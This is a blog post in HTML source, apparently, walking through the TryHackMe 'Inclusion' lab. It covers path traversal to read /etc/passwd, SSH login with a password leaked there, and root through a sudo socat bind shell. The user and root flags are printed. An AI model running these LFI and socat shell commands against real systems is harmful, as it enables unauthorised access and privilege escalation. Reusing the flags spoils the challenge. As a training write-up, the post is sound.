@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang=en><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title> Inclusion - .burso</title>
+    <meta name="description" content="Hi guys, after long time I have 5 minutes for playing game, so let&rsquo;s play. I see new game called Inclusion with describe A beginner level LFI challenge. Yes, this is something I want to play and have been done quick.
+So I am starting VPN tunnel to our playground and click on magic button Deploy machine.
+As always first scan ports opened on the machine.
+$ nmap -T4 -sV 10.">
+    <link rel="canonical" href="/ctf/thm/inclusion/">
+    <link rel="icon" href="/img/favicon.jpg" type="image/gif" sizes="16x16"> 
+    <meta property="og:title" content="Inclusion">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="/ctf/thm/inclusion/">
+    <meta property="og:description" content="Hi guys, after long time I have 5 minutes for playing game, so let&rsquo;s play. I see new game called Inclusion with describe A beginner level LFI challenge. Yes, this is something I want to play and have been done quick.
+So I am starting VPN tunnel to our playground and click on magic button Deploy machine.
+As always first scan ports opened on the machine.
+$ nmap -T4 -sV 10.">
+    <meta property="og:site_name" content=".burso">
+    <link rel="stylesheet" href="/css/main.min.7fdf1d02dafd1a6eb5cfd0d707e17e33515b866f5d305a0ab01a4095577484fe.css" integrity="sha256-f98dAtr9Gm61z9DXB&#43;F&#43;M1Fbhm9dMFoKsBpAlVd0hP4=">
+    <meta name="generator" content="Hugo 0.80.0" />
+    <script type="module" src="https://unpkg.com/ionicons@5.1.2/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule="" src="https://unpkg.com/ionicons@5.1.2/dist/ionicons/ionicons.js"></script>
+    
+</head>
+<body><header class="site-header">
+    <nav class="site-nav" role="navigation" aria-label="breadcrumb">
+    <ol itemscope itemtype="https://schema.org/BreadcrumbList" class="breadcrumb"><li class="breadcrumb-item  " 
+  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+  <a itemtype="https://schema.org/Thing" itemprop="item" href="/">
+    <span itemprop="name">.burso</span>
+  </a>
+  <meta itemprop="position" content="0" />
+</li>/<li class="breadcrumb-item  " 
+  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+  <a itemtype="https://schema.org/Thing" itemprop="item" href="/ctf/">
+    <span itemprop="name">ctf</span>
+  </a>
+  <meta itemprop="position" content="0" />
+</li>/<li class="breadcrumb-item  " 
+  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+  <a itemtype="https://schema.org/Thing" itemprop="item" href="/ctf/thm/">
+    <span itemprop="name">thm</span>
+  </a>
+  <meta itemprop="position" content="0" />
+</li>/<li class="breadcrumb-item active hidden" aria-current="page"
+  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+  <a itemtype="https://schema.org/Thing" itemprop="item" href="/ctf/thm/inclusion/">
+    <span itemprop="name">inclusion</span>
+  </a>
+  <meta itemprop="position" content="1" />
+</li></ol>
+    </nav>
+    <h1 class="site-title hidden">
+		<a href="/">.burso</a>
+    </h1>
+</header>
+<main id="content">
+<article role="article" class="content post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+    <header class="post-header">        
+        <h2 class="post-title" itemprop="name headline">Inclusion</h2>
+        <span class="post-meta">
+            <time class="date-published" datetime="2020-03-16T18:42:36&#43;07:00" itemprop="datePublished">
+                Mon, 16 Mar 2020
+            </time>
+            
+            <ul id="tags">
+              
+                <li> <a href="/tags/ctf">#ctf</a> </li>
+              
+                <li> <a href="/tags/tryhackme">#tryhackme</a> </li>
+              
+                <li> <a href="/tags/lfi">#LFI</a> </li>
+              
+                <li> <a href="/tags/socat">#socat</a> </li>
+              
+            </ul>
+            
+        </span>
+    </header>
+    <div class="post-content" itemprop="articleBody">
+        <p>Hi guys, after long time I have 5 minutes for playing game, so let&rsquo;s play.
+I see new game called <strong>Inclusion</strong> with describe <strong>A beginner level LFI challenge</strong>.
+Yes, this is something I want to play and have been done quick.</p>
+<p>So I am starting VPN tunnel to our playground and click on magic button <strong>Deploy machine</strong>.</p>
+<p>As always first scan ports opened on the machine.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nmap -T4 -sV 10.10.131.100 --top <span style="color:#ae81ff">100</span>                              
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-03-16 18:30 CET   
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.131.100     
+Host is up <span style="color:#f92672">(</span>0.15s latency<span style="color:#f92672">)</span>.                                                                                                                                   
+Not shown: <span style="color:#ae81ff">98</span> closed ports                                                     
+PORT   STATE SERVICE VERSION                                                   
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+80/tcp open  http    Werkzeug httpd 0.16.0 <span style="color:#f92672">(</span>Python 3.6.9<span style="color:#f92672">)</span>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+                                                                               
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 9.86 seconds         
+</code></pre></div><p>Okay, so some default ports opened. Open the browser, read the articles, we can see, that there is only one parameter
+called <strong>name</strong> of article.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">GET /article?name<span style="color:#f92672">=</span>lfiattack
+...
+Even without the ability to upload and execute code, a Local File Inclusion vulnerability can be dangerous. An attacker can still perform a Directory Traversal / Path Traversal attack using an LFI vulnerability as follows.
+
+
+
+http://example.com/?file<span style="color:#f92672">=</span>../../../../etc/passwd
+...
+</code></pre></div><p>Okey, so at first we can try the version of LFI in the example. Let&rsquo;s use CLI</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl <span style="color:#e6db74">&#39;http://10.10.131.100/article?name=../../../../etc/passwd&#39;</span>
+...
+root❌0:0:root:/root:/bin/bash
+daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin❌2:2:bin:/bin:/usr/sbin/nologin
+sys❌3:3:sys:/dev:/usr/sbin/nologin
+sync❌4:65534:sync:/bin:/bin/sync
+games❌5:60:games:/usr/games:/usr/sbin/nologin
+man❌6:12:man:/var/cache/man:/usr/sbin/nologin
+lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail❌8:8:mail:/var/mail:/usr/sbin/nologin
+news❌9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy❌13:13:proxy:/bin:/usr/sbin/nologin
+www-data❌33:33:www-data:/var/www:/usr/sbin/nologin
+backup❌34:34:backup:/var/backups:/usr/sbin/nologin
+list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats❌41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network❌100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve❌101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog❌102:106::/home/syslog:/usr/sbin/nologin
+messagebus❌103:107::/nonexistent:/usr/sbin/nologin
+_apt❌104:65534::/nonexistent:/usr/sbin/nologin
+lxd❌105:65534::/var/lib/lxd/:/bin/false
+uuidd❌106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq❌107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape❌108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate❌109:1::/var/cache/pollinate:/bin/false
+falconfeast❌1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash
+<span style="color:#75715e">#falconfeast:rootpassword</span>
+sshd❌110:65534::/run/sshd:/usr/sbin/nologin
+mysql❌111:116:MySQL Server,,,:/nonexistent:/bin/false
+...
+</code></pre></div><p>It looks like we have password in the comment of the file <strong>/etc/passwd</strong></p>
+<ul>
+<li>#falconfeast:rootpassword</li>
+</ul>
+<p>so let&rsquo;s use <strong>ssh</strong> with the gained username/password</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh falconfeast@10.10.131.100                                                                                                                   
+The authenticity of host <span style="color:#e6db74">&#39;10.10.131.100 (10.10.131.100)&#39;</span> can<span style="color:#e6db74">&#39;t be established.                                                                                
+</span><span style="color:#e6db74">ECDSA key fingerprint is SHA256:VRi7CZbTMsqjwnWmH2UVPWrLVIZzG4BQ9J6X+tVsuEQ.                                                                                  
+</span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no)? yes                                                                                                    
+</span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.10.131.100<span style="color:#e6db74">&#39; (ECDSA) to the list of known hosts.
+</span><span style="color:#e6db74">rfalconfeast@10.10.131.100&#39;</span>s password: 
+Welcome to Ubuntu 18.04.3 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-74-generic x86_64<span style="color:#f92672">)</span>
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Mar <span style="color:#ae81ff">16</span> 23:06:55 IST <span style="color:#ae81ff">2020</span>
+
+  System load:  0.01              Processes:           <span style="color:#ae81ff">84</span>
+  Usage of /:   34.8% of 9.78GB   Users logged in:     <span style="color:#ae81ff">0</span>
+  Memory usage: 64%               IP address <span style="color:#66d9ef">for</span> eth0: 10.10.131.100
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available <span style="color:#66d9ef">for</span> installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+<span style="color:#ae81ff">3</span> packages can be updated.
+<span style="color:#ae81ff">3</span> updates are security updates.
+
+
+Last login: Thu Jan <span style="color:#ae81ff">23</span> 18:41:39 <span style="color:#ae81ff">2020</span> from 192.168.1.107
+$ falconfeast@inclusion:~$ ls
+articles  user.txt
+$ falconfeast@inclusion:~$ cat user.txt 
+<span style="color:#ae81ff">60989655118397345799</span>
+</code></pre></div><p>In falconfeast&rsquo;s homedir we can find the <strong>user.txt</strong> file with the flag
+<strong>user flag</strong></p>
+<ul>
+<li>60989655118397345799</li>
+</ul>
+<p>but how to get the <strong>root flag</strong>?
+let&rsquo;s look for options</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> falconfeast on inclusion:
+    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+
+User falconfeast may run the following commands on inclusion:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/socat
+</code></pre></div><p>Okay, we can run <strong>socat</strong> under root priviledges without password. That&rsquo;s enough for us.</p>
+<ul>
+<li>On remote machine</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo socat TCP-LISTEN:1111,reuseaddr,fork EXEC:sh,pty,stderr,setsid,sigint,sane
+</code></pre></div><ul>
+<li>On local machine</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ socat FILE:<span style="color:#e6db74">`</span>tty<span style="color:#e6db74">`</span>,raw,echo<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> TCP:10.10.131.100:1111
+sh: 0: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
+<span style="color:#75715e"># pwd</span>
+/home/falconfeast
+<span style="color:#75715e"># cd /root</span>
+<span style="color:#75715e"># ls</span>
+root.txt
+<span style="color:#75715e"># cat root.txt</span>
+<span style="color:#ae81ff">42964104845495153909</span>
+</code></pre></div><p>Ou yeah, we have root priviledges! :)
+<strong>root flag</strong></p>
+<ul>
+<li>42964104845495153909</li>
+</ul>
+<p>
+<a href="https://linux.die.net/man/1/socat" target="_blank" rel="nofollow noreferrer noopener">socat</a> is really strong network utility, I recommend to read more about it.
+Have a another nice day with COVID-19.
+bye;)</p>
+
+    </div>
+</article>
+<div class="pagination">
+    
+    <div class="prev"> <a href="/ctf/thm/bookface/">Previous Post</a> </div>
+    
+    
+</div>
+
+
+        </main><footer class="site-footer">
+	<span class="left">Gohugo/0.80.0 </span> 
+	<span class="right">
+		<em>.burso</em>
+	</span>
+</footer>
+</body>
+</html>
